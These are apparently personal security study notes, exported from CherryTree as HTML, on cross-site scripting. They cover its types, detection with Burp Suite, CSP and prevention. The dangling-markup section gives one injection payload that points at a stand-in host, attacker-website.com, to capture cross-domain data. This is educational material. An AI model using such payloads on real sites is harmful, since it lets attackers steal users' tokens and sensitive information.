<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>XSS</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>XSS</h1><br/><strong>What is it?</strong><br />• Attacker compromises interactions user has with vulnerable application<br />• Circumvent same origin policy designed to segregate different websites<br />• Manipulate vulnerable website so it return malicious JS to users<br /><br /><strong>Detection</strong><br />• Burp Suite&#39;s web vulnerability scanner<br />• Manually:<br />	• Test all entry points (URL parameters, HTTP headers)<br />	• Submit random alphanumeric values (8 chars, use Burp Intruder’s number payload) (Burp Intruder grep payload options to flag responses with that value)<br />	• Find location of reflection<br />	• Test out some payloads in Burp Repeater<br />	• Test in browser (just something simple like an alert)<br />	<br /><strong>Types</strong><br />• Reflected: script comes from current HTTP request<br />• Stored: script comes from website’s DB<br />• DOM-Based: vulnerability in client-side code rather than server-side<br /><br />• Difference between Reflected and Stored: Stored is more serious from a security perspective.<br /><strong><br />Scripting Contexts</strong><br />• Especially relevant for reflected and stored<br />• Between HTML tags<br />• In HTML Tag attributes<br /><strong><br />Content Security Policy</strong><br />• CSP is a browser mechanism that aims to mitigate the impact of CSS and other vulns<br />• Can often be circumvented often.<br /><strong><br />Dangling Markup Injection</strong><br />• Used to capture data cross-domain when full XSS exploit impossible<br />   ◇ Often due to input filters<br />• Can capture sensitive info (including CSRF, which can be used to perform unauthorised actions on a users behalf)<br />• It&#39;s when you enter an unclosed tag, like:<br />   ◇ &quot;&gt;&lt;img src=&#39;//attacker-website.com?        <br /><strong><br />Prevention</strong><br />• Filter/validate input on arrival<br />• Encode data on output =&gt; HTML, URL, JS and CSS encoding<br />• Use appropriate response headers<br />   ◇ Use content-type and X-content-type-options headers to ensure browsers interpret responses the way you intend<br />   ◇ CSP<br />• Whitelisting vs Blocklisting<br />   ◇ Input validation should use whitelisting<br />   ◇ Only enable safe protocols and block everything else.<br />• <a href="https://portswigger.net/web-security/cross-site-scripting/preventing">https://portswigger.net/web-security/cross-site-scripting/preventing</a></div></body></html>